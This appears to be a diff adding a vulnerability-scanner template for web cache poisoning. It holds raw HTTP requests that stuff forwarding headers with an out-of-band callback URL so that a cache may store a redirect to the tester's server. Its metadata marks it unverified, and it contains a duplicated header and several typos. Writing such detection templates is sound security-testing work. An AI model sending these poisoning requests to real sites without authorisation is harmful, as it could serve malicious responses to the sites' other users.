@@ -1,0 +1,55 @@
+id: cache-poisoning--oob-test
+
+info:
+  name:  Web Cache Poisoning via Headers
+  author: RosePwns
+  severity: high
+  description: |
+    This web application is using a caching system. By sending a request with the below headers, we can overide the Host header and force the caching system to cache a response that contains a redirect to our server.
+  impact: |
+    Allows attacks to ptentially server harmful HTTP responses to other users.
+  metadata:
+    verified: false
+  tags: web,cache,poisioning,headers
+
+http:
+  - raw:
+      - |
+        GET {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Forwarded-Prefix: {{interactsh-url}}
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Forwarded-For: {{interactsh-url}}
+        X-Originating-IP: {{interactsh-url}}
+        X-Remote-IP: {{interactsh-url}}
+        X-Remote-Addr: {{interactsh-url}}
+        X-Client-IP: {{interactsh-url}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: interactsh_protocol # Confirms DNS Interaction
+        words:
+          - "dns"
+  - raw:
+      - |
+        GET {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Forwarded-Prefix: {{interactsh-url}}
+        X-Forwarded-Host: {{interactsh-url}}
+        X-Forwarded-For: {{interactsh-url}}
+        X-Originating-IP: {{interactsh-url}}
+        X-Remote-IP: {{interactsh-url}}
+        X-Remote-Addr: {{interactsh-url}}
+        X-Client-IP: {{interactsh-url}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_2, {{interactsh-url}}) == true'
